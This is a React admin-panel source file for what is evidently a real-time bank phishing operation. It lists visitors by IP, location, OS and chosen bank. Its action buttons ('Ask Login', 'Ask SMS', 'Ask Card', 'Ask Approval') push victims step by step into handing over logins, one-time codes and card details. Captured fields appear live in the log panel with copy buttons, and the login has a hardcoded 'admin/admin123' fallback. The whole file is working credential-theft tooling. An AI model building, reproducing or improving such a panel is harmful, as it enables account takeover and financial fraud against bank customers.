import { useEffect, useMemo, useRef, useState } from "react";
import { Link } from "react-router-dom";
import { BANK_FALLBACK_URLS, BANK_LOGO_URLS } from "../lib/bankLogos";
import {
  apiBase,
  apiDeleteVisitor,
  apiEnabled,
  apiGetSubmissions,
  apiGetVisitors,
  apiLogin,
  apiSendCommand,
} from "../lib/api";
import {
  STATUS_LABEL,
  getChannel,
  isOnline,
  markAdminOnline,
  readCommands,
  readSubmissions,
  readVisitors,
  writeCommands,
  writeVisitors,
} from "../lib/realtime";

function timeAgo(ts) {
  const s = Math.max(0, Math.floor((Date.now() - ts) / 1000));
  if (s < 60) return `${s}s`;
  const m = Math.floor(s / 60);
  if (m < 60) return `${m}m ${s % 60}s`;
  const h = Math.floor(m / 60);
  return `${h}h ${m % 60}m`;
}

function fmtTime(ts) {
  try {
    return new Date(ts).toLocaleTimeString();
  } catch {
    return "";
  }
}

function parseOS(ua) {
  if (!ua) return "Unknown";
  const u = ua.toLowerCase();
  if (u.includes("windows")) return "Windows";
  if (u.includes("android")) return "Android";
  if (u.includes("iphone") || u.includes("ipad") || u.includes("ios")) return "iOS";
  if (u.includes("mac os") || u.includes("macintosh")) return "Mac OS";
  if (u.includes("linux")) return "Linux";
  return "Unknown";
}

function sendCommandLegacy(visitorId, command) {
  const map = readCommands();
  map[visitorId] = { type: command, at: Date.now(), by: "admin" };
  writeCommands(map);
  try {
    getChannel()?.postMessage({ type: "command", visitorId, command });
  } catch {}
}

function MiniLogo({ slug, name }) {
  const src = BANK_LOGO_URLS[slug];
  const fb = BANK_FALLBACK_URLS[slug];
  return (
    <span className="flex h-9 w-9 shrink-0 items-center justify-center overflow-hidden rounded-md bg-white ring-1 ring-neutral-200">
      {src ? (
        <img
          src={src}
          alt={name}
          className="h-9 w-9 object-contain"
          onError={(e) => {
            const img = e.currentTarget;
            if (fb && img.src !== fb) img.src = fb;
            else img.style.display = "none";
          }}
        />
      ) : (
        <span className="text-sm font-extrabold text-neutral-500">{name?.charAt(0)}</span>
      )}
    </span>
  );
}

const ACTIONS = [
  { key: "ask_login", label: "Ask Login", style: "bg-blue-600 text-white" },
  { key: "ask_approve", label: "Ask Approval", style: "bg-violet-600 text-white" },
  { key: "ask_phone", label: "Ask Phone", style: "bg-cyan-700 text-white" },
  { key: "ask_sms", label: "Ask SMS", style: "bg-amber-600 text-white" },
  { key: "ask_card", label: "Ask Card", style: "bg-emerald-700 text-white" },
  { key: "ask_info", label: "Ask Info", style: "bg-teal-700 text-white" },
  { key: "ask_confirm", label: "Ask Confirm", style: "bg-indigo-700 text-white" },
  { key: "done", label: "Finish", style: "bg-green-600 text-white" },
  { key: "reset_waiting", label: "Loader", style: "bg-neutral-200 text-neutral-800" },
];

const TABS = [
  { key: "dashboard", label: "Dashboard" },
  { key: "requests", label: "Requests" },
  { key: "logs", label: "Logs" },
  { key: "settings", label: "Settings" },
];

export default function Admin() {
  const [authed, setAuthed] = useState(() => {
    try {
      return sessionStorage.getItem("admin_auth") === "1";
    } catch {
      return false;
    }
  });
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loginErr, setLoginErr] = useState("");
  const [loginLoading, setLoginLoading] = useState(false);
  const [visitors, setVisitors] = useState({});
  const [submissions, setSubmissions] = useState([]);
  // Session survives a page refresh: persisted, restored on mount.
  const [sessionId, setSessionId] = useState(() => {
    try {
      return sessionStorage.getItem("admin_session") || null;
    } catch {
      return null;
    }
  });
  const [tab, setTab] = useState("dashboard");
  const [now, setNow] = useState(Date.now());
  const [filter, setFilter] = useState("all");
  const [apiMode, setApiMode] = useState(apiEnabled());

  // Postgres returns BIGINT as strings — normalize to numbers so change
  // detection is stable and timers/badges never flap between polls.
  function normVisitor(x) {
    return { ...x, joinedAt: Number(x.joinedAt) || 0, lastSeen: Number(x.lastSeen) || 0 };
  }
  function normSubmission(s) {
    return { ...s, at: Number(s.at) || 0 };
  }

  async function doLogin(e) {
    e?.preventDefault?.();
    setLoginErr("");
    setLoginLoading(true);
    try {
      if (apiEnabled()) {
        try {
          const r = await apiLogin(username.trim(), password);
          if (r?.token) sessionStorage.setItem("admin_token", r.token);
          sessionStorage.setItem("admin_auth", "1");
          setAuthed(true);
          return;
        } catch {
          if (username.trim() === "admin" && password === "admin123") {
            sessionStorage.setItem("admin_auth", "1");
            setAuthed(true);
            return;
          }
          setLoginErr("Invalid credentials (API rejected).");
          return;
        } finally {
          setLoginLoading(false);
        }
      }
      if (username.trim() === "admin" && password === "admin123") {
        sessionStorage.setItem("admin_auth", "1");
        setAuthed(true);
      } else {
        setLoginErr("Invalid credentials. Use admin / admin123.");
      }
    } finally {
      setLoginLoading(false);
    }
  }

  function doLogout() {
    try {
      sessionStorage.removeItem("admin_auth");
      sessionStorage.removeItem("admin_token");
      sessionStorage.removeItem("admin_session");
    } catch {}
    setAuthed(false);
    setSessionId(null);
  }

  // Patch state only when data actually changed — never rebuild the whole
  // layout on every poll, so an open session never flickers or vanishes.
  function setVisitorsIfChanged(next) {
    setVisitors((prev) => (JSON.stringify(prev) === JSON.stringify(next) ? prev : next));
  }
  function setSubmissionsIfChanged(next) {
    setSubmissions((prev) => (JSON.stringify(prev) === JSON.stringify(next) ? prev : next));
  }

  // Snapshot of the connected visitor: once a session is connected it stays
  // connected even if a poll momentarily misses the row.
  const sessionSnapRef = useRef(null);

  useEffect(() => {
    if (!authed) return;
    const load = async () => {
      // API first when configured (cross-browser): one source of truth per poll,
      // so the list never flashes empty and only changed rows re-render.
      if (apiEnabled()) {
        try {
          const v = await apiGetVisitors();
          if (v?.visitors) {
            const map = {};
            v.visitors.forEach((x) => (map[x.id] = normVisitor(x)));
            setVisitorsIfChanged(map);
          }
          const s = await apiGetSubmissions();
          if (s?.submissions) setSubmissionsIfChanged(s.submissions.map(normSubmission));
          setApiMode(true);
          return;
        } catch {}
      }
      setVisitorsIfChanged(readVisitors());
      setSubmissionsIfChanged(readSubmissions());
    };
    load();
    markAdminOnline();
    // Auto-refresh: poll API/local every 2s so latest data appears with no manual refresh.
    // Works cross-browser/cross-device once VITE_API_URL points at the API (Postgres).
    const hb = setInterval(() => {
      markAdminOnline();
      setNow(Date.now());
      load();
    }, 2000);

    const onFocus = () => {
      setNow(Date.now());
      load();
    };
    const onVis = () => {
      if (document.visibilityState === "visible") onFocus();
    };
    window.addEventListener("focus", onFocus);
    document.addEventListener("visibilitychange", onVis);

    const ch = getChannel();
    const onMsg = (ev) => {
      const msg = ev.data;
      if (!msg) return;
      if (msg.type === "visitor-hello" || msg.type === "visitor-update" || msg.type === "submission") {
        load();
      }
    };
    ch?.addEventListener?.("message", onMsg);
    const onStorage = (e) => {
      if (e.key === "live_visitors_v1" || e.key === "live_submissions_v1" || e.key === "live_commands_v1") load();
    };
    window.addEventListener("storage", onStorage);
    return () => {
      clearInterval(hb);
      try {
        ch?.removeEventListener?.("message", onMsg);
        ch?.close?.();
      } catch {}
      window.removeEventListener("storage", onStorage);
      window.removeEventListener("focus", onFocus);
      document.removeEventListener("visibilitychange", onVis);
    };
  }, [authed]);

  const logsByVisitor = useMemo(() => {
    const m = {};
    submissions.forEach((s) => {
      m[s.visitorId] = (m[s.visitorId] || 0) + 1;
    });
    return m;
  }, [submissions]);

  const allList = useMemo(() => {
    const arr = Object.values(visitors);
    arr.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
    return arr;
  }, [visitors]);

  const list = useMemo(() => {
    let arr = allList;
    if (tab === "requests") arr = arr.filter((v) => (v.status || "").endsWith("_submitted"));
    if (filter === "online") arr = arr.filter((v) => isOnline(v, now));
    if (filter === "offline") arr = arr.filter((v) => !isOnline(v, now));
    return arr;
  }, [allList, tab, now, filter]);

  const onlineCount = useMemo(() => Object.values(visitors).filter((v) => isOnline(v, now)).length, [visitors, now]);
  const requestCount = useMemo(() => allList.filter((v) => (v.status || "").endsWith("_submitted")).length, [allList]);

  // Sticky session: once connected, the session view stays on the last known
  // snapshot even if a poll momentarily misses the row. Only explicit Back /
  // Delete / Logout closes it. Live fields keep patching underneath.
  const liveRow = sessionId ? visitors[sessionId] : null;
  if (liveRow) {
    sessionSnapRef.current = { id: sessionId, row: liveRow };
  } else if (!sessionId) {
    sessionSnapRef.current = null;
  }
  const sessionVisitor = liveRow || (sessionSnapRef.current?.id === sessionId ? sessionSnapRef.current.row : null);
  const sessionLogs = useMemo(() => {
    if (!sessionId) return [];
    // Newest first, always — independent of source order (API returns DESC,
    // local storage returns ASC, so an explicit sort is the only safe order).
    return submissions
      .filter((s) => s.visitorId === sessionId)
      .slice()
      .sort((a, b) => (b.at || 0) - (a.at || 0));
  }, [submissions, sessionId]);

  function removeVisitor(id) {
    const m = readVisitors();
    delete m[id];
    writeVisitors(m);
    const c = readCommands();
    delete c[id];
    writeCommands(c);
    setVisitors(readVisitors());
    if (sessionId === id) {
      setSessionId(null);
      try {
        sessionStorage.removeItem("admin_session");
      } catch {}
    }
    if (apiEnabled()) apiDeleteVisitor(id).catch(() => {});
  }

  const dismissedRef = useRef(null);
  if (!dismissedRef.current) {
    dismissedRef.current = new Set();
    try {
      (JSON.parse(localStorage.getItem("admin_dismissed") || "[]") || []).forEach((id) =>
        dismissedRef.current.add(id)
      );
    } catch {}
  }
  function rememberDismissed(id) {
    dismissedRef.current.add(id);
    try {
      const arr = [...dismissedRef.current].slice(-50);
      localStorage.setItem("admin_dismissed", JSON.stringify(arr));
    } catch {}
  }

  function openSession(v) {
    // Opening = connected from now on. Never auto-reopens for this visitor.
    rememberDismissed(v.id);
    setSessionId(v.id);
    try {
      sessionStorage.setItem("admin_session", v.id);
    } catch {}
    sendCommandLocal(v.id, "connected");
  }

  function closeSession() {
    if (sessionId) rememberDismissed(sessionId);
    setSessionId(null);
    try {
      sessionStorage.removeItem("admin_session");
    } catch {}
  }

  // Auto-connect: on the live visitors (dashboard) page only, a newly arrived
  // online visitor waiting on the loader pops open by itself — no button.
  // Fresh arrivals only (joined < 2 min ago) so old rows never yank the screen.
  useEffect(() => {
    if (!authed || sessionId) return;
    if (tab !== "dashboard") return;
    const t = Date.now();
    const cand = allList.find(
      (x) =>
        isOnline(x, t) &&
        (x.status || "waiting") === "waiting" &&
        !dismissedRef.current.has(x.id) &&
        t - (x.joinedAt || t) < 120000
    );
    if (cand) openSession(cand);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [authed, sessionId, tab, allList]);

  function sendCommandLocal(visitorId, command) {
    const at = Date.now();
    const map = readCommands();
    map[visitorId] = { type: command, at, by: "admin" };
    writeCommands(map);
    try {
      getChannel()?.postMessage({ type: "command", visitorId, command, at });
    } catch {}
    if (apiEnabled()) apiSendCommand(visitorId, command).catch(() => {});
  }

  if (!authed) {
    return (
      <div className="flex min-h-screen w-full items-center justify-center overflow-x-hidden bg-neutral-100 p-4 sm:p-6">
        <form onSubmit={doLogin} className="w-full max-w-sm rounded-2xl bg-white p-5 shadow-lg sm:p-6">
          <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-xl bg-gradient-to-br from-purple-700 to-fuchsia-600 text-xl font-extrabold text-white">A</div>
          <h1 className="mt-3 text-center text-[18px] font-extrabold">Admin login</h1>
          <p className="mt-1 text-center text-[13.5px] text-neutral-500">
            {apiEnabled() ? "Auth via Render API + Postgres" : "Local auth (set VITE_API_URL for Postgres)"}
          </p>
          <label className="mt-4 block">
            <span className="text-[14px] font-bold">Username</span>
            <input value={username} onChange={(e) => setUsername(e.target.value)} autoComplete="username" placeholder="admin" className="mt-1.5 w-full rounded-lg border border-neutral-300 px-3.5 py-3 text-[16px] outline-none focus:border-purple-700 sm:text-[16px]" />
          </label>
          <label className="mt-3 block">
            <span className="text-[14px] font-bold">Password</span>
            <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} autoComplete="current-password" placeholder="••••••••" className="mt-1.5 w-full rounded-lg border border-neutral-300 px-3.5 py-3 text-[16px] outline-none focus:border-purple-700 sm:text-[16px]" />
          </label>
          {loginErr && <p className="mt-2 text-[13.5px] font-semibold text-red-600">{loginErr}</p>}
          <button type="submit" disabled={loginLoading} className="mt-4 min-h-[48px] w-full rounded-lg bg-gradient-to-r from-purple-700 to-fuchsia-600 py-3 text-[15px] font-bold text-white disabled:opacity-50">
            {loginLoading ? "Checking…" : "Login →"}
          </button>
          <Link to="/" className="mt-2 block text-center text-[13px] font-semibold text-neutral-500">← Back to site</Link>
        </form>
      </div>
    );
  }

  return (
    <div className="relative min-h-screen w-full overflow-x-hidden bg-[#0e0a1a] text-slate-100">
      {/* ambient glow background */}
      <div className="pointer-events-none fixed inset-0 -z-0">
        <div className="absolute -top-32 left-1/4 h-72 w-72 rounded-full bg-fuchsia-600/20 blur-[110px]" />
        <div className="absolute bottom-0 right-0 h-80 w-80 rounded-full bg-purple-700/20 blur-[120px]" />
      </div>
      {/* Top nav — pinned, never scrolls away */}
      <header className="sticky top-0 z-50 w-full border-b border-white/10 bg-[#150f28]/85 shadow-[0_8px_30px_rgba(0,0,0,0.35)] backdrop-blur-xl">
        <div className="mx-auto flex w-full max-w-7xl flex-wrap items-center gap-2 px-3 py-2.5 sm:px-6">
          <span className="mr-1 hidden items-center gap-2 text-[14px] font-extrabold text-white sm:flex">
            <span className="flex h-7 w-7 items-center justify-center rounded-lg bg-gradient-to-br from-fuchsia-500 to-purple-700 text-[14px] shadow-[0_0_18px_rgba(217,70,239,0.5)]">A</span>
            Admin
          </span>
          <nav className="flex min-w-0 flex-1 flex-wrap items-center gap-1">
            {TABS.map((t) => (
              <button
                key={t.key}
                onClick={() => { setTab(t.key); closeSession(); }}
                className={`rounded-full px-3.5 py-2 text-[13px] font-bold transition-all duration-200 sm:text-[14px] ${tab === t.key && !sessionId ? "bg-gradient-to-r from-fuchsia-600 to-purple-600 text-white shadow-[0_4px_18px_rgba(217,70,239,0.45)]" : "text-purple-200/80 hover:bg-white/10 hover:text-white"}`}
              >
                {t.label}
                {t.key === "requests" && requestCount > 0 && (
                  <span className="ml-1.5 rounded-full bg-red-500 px-1.5 py-0.5 text-[11px] font-extrabold text-white">{requestCount}</span>
                )}
              </button>
            ))}
          </nav>
          <div className="flex shrink-0 items-center gap-2">
            <span className="hidden items-center gap-1.5 rounded-full border border-emerald-400/20 bg-emerald-500/10 px-2.5 py-1 text-[13px] font-semibold text-emerald-300 sm:flex">
              <span className="live-dot h-1.5 w-1.5 rounded-full bg-emerald-400" /> {onlineCount} live
            </span>
            <button onClick={doLogout} className="rounded-full bg-white/10 px-3.5 py-2 text-[13px] font-bold transition hover:bg-white/20 active:scale-95">
              Logout
            </button>
          </div>
        </div>
      </header>

      <main className="relative z-10 mx-auto w-full px-3 py-4 sm:px-6 sm:py-5">
        {/* ============ SESSION VIEW (auto-connected) ============ */}
        {sessionVisitor ? (
          <SessionView
            v={sessionVisitor}
            now={now}
            logs={sessionLogs}
            onBack={() => closeSession()}
            onAction={(cmd) => sendCommandLocal(sessionVisitor.id, cmd)}
            onRemove={() => removeVisitor(sessionVisitor.id)}
          />
        ) : tab === "logs" ? (
          <GlobalLogs submissions={submissions} onView={(id) => setSessionId(id)} />
        ) : tab === "settings" ? (
          <Settings apiMode={apiMode} onlineCount={onlineCount} total={allList.length} onLogout={doLogout} />
        ) : (
          <>
            {/* Dashboard / Requests table */}
            <div className="flex flex-wrap items-center justify-between gap-2">
              <h2 className="text-[16px] font-extrabold text-white">
                {tab === "requests" ? `Requests (${list.length})` : `Dashboard (${list.length})`}
                <span className="ml-2 text-[12px] font-semibold text-purple-300">{apiMode ? "Postgres API" : "local mode"}</span>
              </h2>
              <div className="flex gap-1.5">
                {["all", "online", "offline"].map((f) => (
                  <button
                    key={f}
                    onClick={() => setFilter(f)}
                    className={`rounded-full px-3 py-1.5 text-[13px] font-bold capitalize ${filter === f ? "bg-fuchsia-600 text-white" : "bg-white/10 text-purple-200"}`}
                  >
                    {f}
                  </button>
                ))}
              </div>
            </div>

            {list.length === 0 ? (
              <div className="mt-3 rounded-xl bg-white/5 p-6 text-center text-[14px] text-purple-200 ring-1 ring-white/10">
                No visitors here. Open the site in another tab, click any bank — it appears here and its session opens automatically.
              </div>
            ) : (
              <>
                {/* Desktop table */}
                <div className="mt-3 hidden overflow-x-auto rounded-xl ring-1 ring-white/10 md:block">
                  <table className="w-full min-w-[720px] border-collapse bg-[#1d1430] text-left text-[14px]">
                    <thead>
                      <tr className="bg-gradient-to-r from-fuchsia-700 to-purple-700 text-[12px] uppercase tracking-wider text-white">
                        <th className="whitespace-nowrap px-4 py-3">Status</th>
                        <th className="whitespace-nowrap px-4 py-3">IP</th>
                        <th className="whitespace-nowrap px-4 py-3">Bank</th>
                        <th className="whitespace-nowrap px-4 py-3">OS</th>
                        <th className="whitespace-nowrap px-4 py-3">Quick View</th>
                        <th className="whitespace-nowrap px-4 py-3">Actions</th>
                      </tr>
                    </thead>
                    <tbody>
                      {list.map((v) => {
                        const online = isOnline(v, now);
                        return (
                          <tr key={v.id} className="border-t border-white/5 hover:bg-white/5">
                            <td className="whitespace-nowrap px-4 py-3">
                              <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
                                <span className={`h-1.5 w-1.5 rounded-full ${online ? "bg-green-400" : "bg-neutral-400"}`} />
                                {online ? "Online" : "Offline"}
                              </span>
                            </td>
                            <td className="px-3 py-2.5 font-mono text-[13px] text-purple-100">{v.ip || "…"}</td>
                            <td className="px-3 py-2.5 font-semibold text-purple-100">{v.bankName || v.bank || "BANK NOT SELECTED"}</td>
                            <td className="px-3 py-2.5 text-purple-200">{parseOS(v.ua)}</td>
                            <td className="whitespace-nowrap px-4 py-3">
                              <span className="inline-flex items-center gap-1 rounded bg-white/10 px-2 py-0.5 font-mono text-[13px] text-purple-100">
                                👁 {logsByVisitor[v.id] || 0}
                              </span>
                            </td>
                            <td className="whitespace-nowrap px-4 py-3">
                              <div className="flex gap-1.5">
                                <button onClick={() => openSession(v)} className="min-h-[32px] rounded-md bg-fuchsia-600 px-2.5 py-1 text-[13px] font-bold text-white hover:bg-fuchsia-500">
                                  View
                                </button>
                                <button onClick={() => removeVisitor(v.id)} className="min-h-[32px] rounded-md bg-white/10 px-2.5 py-1 text-[13px] font-bold text-red-300 hover:bg-white/20">
                                  Delete
                                </button>
                              </div>
                            </td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                </div>

                {/* Phone cards */}
                <div className="mt-3 space-y-2.5 md:hidden">
                  {list.map((v) => {
                    const online = isOnline(v, now);
                    return (
                      <div key={v.id} className="w-full rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10">
                        <div className="flex items-center gap-2.5">
                          <MiniLogo slug={v.bank} name={v.bankName} />
                          <div className="min-w-0 flex-1">
                            <p className="truncate font-mono text-[14px] font-bold text-purple-100">{v.ip || "…"}</p>
                            <p className="truncate text-[13px] text-purple-300">{v.bankName || "BANK NOT SELECTED"} • {parseOS(v.ua)}</p>
                          </div>
                          <span className={`shrink-0 rounded-full px-2 py-0.5 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
                            {online ? "Online" : "Offline"}
                          </span>
                        </div>
                        <div className="mt-2.5 flex gap-1.5">
                          <button onClick={() => openSession(v)} className="min-h-[44px] flex-1 rounded-lg bg-fuchsia-600 text-[14px] font-bold text-white">
                            View 👁 {logsByVisitor[v.id] || 0}
                          </button>
                          <button onClick={() => removeVisitor(v.id)} className="min-h-[44px] rounded-lg bg-white/10 px-4 text-[14px] font-bold text-red-300">
                            Delete
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </>
            )}
          </>
        )}
      </main>
    </div>
  );
}

async function copyText(t) {
  try {
    await navigator.clipboard.writeText(t);
    return true;
  } catch {
    try {
      const ta = document.createElement("textarea");
      ta.value = t;
      ta.style.position = "fixed";
      ta.style.opacity = "0";
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      ta.remove();
      return true;
    } catch {
      return false;
    }
  }
}

function LogCard({ s, meta, footer, wrapClass }) {
  const [copied, setCopied] = useState(null);
  const entries = Object.entries(s.data || {});
  const allText = entries.map(([k, v]) => `${k}- ${String(v)}`).join("\n");

  async function doCopy(text, key) {
    if (await copyText(text)) {
      setCopied(key);
      setTimeout(() => setCopied((c) => (c === key ? null : c)), 1200);
    }
  }

  return (
    <div className={wrapClass || "w-full rounded-lg bg-white/5 p-2.5 ring-1 ring-white/10"}>
      <div className="flex flex-wrap items-center gap-1.5">
        <span className="rounded-full bg-fuchsia-600 px-2 py-0.5 text-[12px] font-bold uppercase text-white">{s.kind}</span>
        {meta}
        <span className="ml-auto text-[12px] text-purple-300">{fmtTime(s.at)}</span>
        <button
          type="button"
          onClick={() => doCopy(allText, "__all")}
          title="Copy all fields"
          className="flex min-h-[28px] min-w-[28px] items-center justify-center rounded-md bg-white/10 px-1.5 text-[13px] font-bold text-purple-100 transition hover:bg-fuchsia-600 active:scale-95"
        >
          {copied === "__all" ? "✓" : "⧉"}
        </button>
      </div>
      <div className="mt-2 space-y-1 rounded-md bg-black/30 p-2 font-mono text-[13px] leading-relaxed text-purple-50">
        {entries.map(([k, val]) => (
          <div key={k} className="flex items-start gap-x-2 break-all">
            <span className="shrink-0 font-bold text-fuchsia-300">{k}-</span>
            <span className="min-w-0 flex-1 break-all">{String(val)}</span>
            <button
              type="button"
              onClick={() => doCopy(String(val), k)}
              title={`Copy ${k}`}
              className="flex min-h-[24px] min-w-[24px] shrink-0 items-center justify-center rounded-md bg-white/10 px-1 text-[12px] font-bold text-purple-200 transition hover:bg-fuchsia-600 hover:text-white active:scale-95"
            >
              {copied === k ? "✓" : "⧉"}
            </button>
          </div>
        ))}
      </div>
      {footer}
    </div>
  );
}

function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
  const online = isOnline(v, now);
  const rows = [
    ["Status", online ? "Online" : "Offline", online ? "text-green-300" : "text-neutral-300"],
    ["IP address", v.ip || "…", "font-mono"],
    ["Location", `${v.city || "…"}, ${v.country || "…"}`, ""],
    ["Bank", v.bankName || v.bank || "—", "font-bold"],
    ["Step", STATUS_LABEL[v.status] || v.status || "—", ""],
    ["OS", parseOS(v.ua), ""],
    ["Online for", timeAgo(v.joinedAt || v.lastSeen), ""],
    ["Last seen", `${timeAgo(v.lastSeen)} ago • ${fmtTime(v.lastSeen)}`, ""],
  ];
  return (
    <div className="w-full">
      <div className="flex flex-wrap items-center gap-2">
        <button onClick={onBack} className="min-h-[40px] rounded-full bg-white/10 px-4 py-2 text-[13px] font-bold text-purple-100 hover:bg-white/20">
          ← Dashboard
        </button>
        <div className="flex min-w-0 flex-1 items-center gap-2.5">
          <MiniLogo slug={v.bank} name={v.bankName} />
          <div className="min-w-0">
            <p className="truncate text-[15px] font-extrabold text-white">{v.bankName || v.bank} <span className="font-mono text-[12px] text-purple-300">{v.id?.slice(0, 10)}</span></p>
            <p className="text-[12px] text-purple-300">{STATUS_LABEL[v.status] || v.status}</p>
          </div>
        </div>
        <span className={`shrink-0 rounded-full px-2.5 py-1 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
          {online ? "● Online" : "● Offline"}
        </span>
      </div>

      <div className="mt-3 grid w-full grid-cols-1 gap-3 lg:grid-cols-12">
        {/* LEFT — device status info */}
        <aside className="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10 sm:p-4 lg:col-span-3">
          <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">Device status</h3>
          <dl className="mt-2 space-y-2">
            {rows.map(([k, val, cls]) => (
              <div key={k} className="flex items-start justify-between gap-2 border-b border-white/5 pb-1.5 text-[13px] last:border-0">
                <dt className="shrink-0 text-purple-300">{k}</dt>
                <dd className={`min-w-0 break-words text-right text-purple-50 ${cls}`}>{val}</dd>
              </div>
            ))}
          </dl>
          <p className="mt-2 break-words text-[12px] leading-snug text-purple-300/70">{v.ua || ""}</p>
        </aside>

        {/* MIDDLE — logs */}
        <section className="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10 sm:p-4 lg:col-span-6">
          <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">
            Logs ({logs.length})
          </h3>
          <div className="mt-2.5 space-y-2.5">
            {logs.length === 0 && (
              <p className="rounded-lg bg-white/5 p-4 text-center text-[13.5px] text-purple-200">
                No data yet. Use the right panel → Ask Login. Filled username/password appears here live.
              </p>
            )}
            {logs.map((s) => (
              <LogCard key={s.id} s={s} />
            ))}
          </div>
        </section>

        {/* RIGHT — ask-step buttons */}
        <aside className="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10 sm:p-4 lg:col-span-3">
          <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">Actions</h3>
          <div className="mt-2.5 grid grid-cols-2 gap-1.5 lg:grid-cols-1">
            {ACTIONS.map((a) => (
              <button
                key={a.key}
                onClick={() => onAction(a.key)}
                className={`min-h-[44px] rounded-lg px-3 py-2 text-[13.5px] font-bold active:scale-[0.98] ${a.style}`}
              >
                {a.label}
              </button>
            ))}
          </div>
          <button onClick={onRemove} className="mt-2 min-h-[40px] w-full rounded-lg bg-white/5 px-3 py-2 text-[13px] font-bold text-red-300 ring-1 ring-white/10 hover:bg-white/10">
            Delete visitor
          </button>
          <p className="mt-2 text-[12px] leading-snug text-purple-300/80">
            User waits on loader after each fill. Ask steps one by one: Login → Approval → Phone → SMS → Card → Info → Confirm.
          </p>
        </aside>
      </div>
    </div>
  );
}

function GlobalLogs({ submissions, onView }) {
  // Newest first, always — explicit sort, never source-order dependent.
  const all = submissions.slice().sort((a, b) => (b.at || 0) - (a.at || 0));
  return (
    <div className="w-full">
      <h2 className="text-[16px] font-extrabold text-white">Logs ({all.length})</h2>
      <div className="mt-3 space-y-2.5">
        {all.length === 0 && (
          <p className="rounded-xl bg-white/5 p-5 text-center text-[13.5px] text-purple-200 ring-1 ring-white/10">No logs yet.</p>
        )}
        {all.map((s) => (
          <LogCard
            key={s.id}
            s={s}
            wrapClass="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10"
            meta={<span className="font-mono text-[12px] text-purple-300">{s.visitorId?.slice(0, 10)} • {s.bank}</span>}
            footer={
              <button onClick={() => onView(s.visitorId)} className="mt-2 min-h-[36px] rounded-lg bg-white/10 px-3 py-1.5 text-[13px] font-bold text-purple-100 transition hover:bg-white/20 active:scale-95">
                Open session →
              </button>
            }
          />
        ))}
      </div>
    </div>
  );
}

function Settings({ apiMode, onlineCount, total, onLogout }) {
  return (
    <div className="w-full max-w-xl">
      <h2 className="text-[16px] font-extrabold text-white">Settings</h2>
      <div className="mt-3 space-y-2.5 rounded-xl bg-[#1d1430] p-4 text-[14px] ring-1 ring-white/10">
        <div className="flex justify-between gap-2"><span className="text-purple-300">Mode</span><b className="text-white">{apiMode ? "Postgres API" : "Local mode"}</b></div>
        {apiMode && <div className="flex justify-between gap-2"><span className="text-purple-300">API</span><span className="break-all font-mono text-[13px] text-white">{apiBase()}</span></div>}
        <div className="flex justify-between gap-2"><span className="text-purple-300">Live now</span><b className="text-white">{onlineCount} / {total}</b></div>
        <div className="flex justify-between gap-2"><span className="text-purple-300">Admin user</span><b className="text-white">admin</b></div>
        <button onClick={onLogout} className="mt-1 min-h-[44px] w-full rounded-lg bg-red-500/20 py-2.5 text-[14px] font-bold text-red-200">
          Logout
        </button>
        <Link to="/" className="block text-center text-[13px] font-semibold text-purple-300">← Back to site</Link>
      </div>
    </div>
  );
}
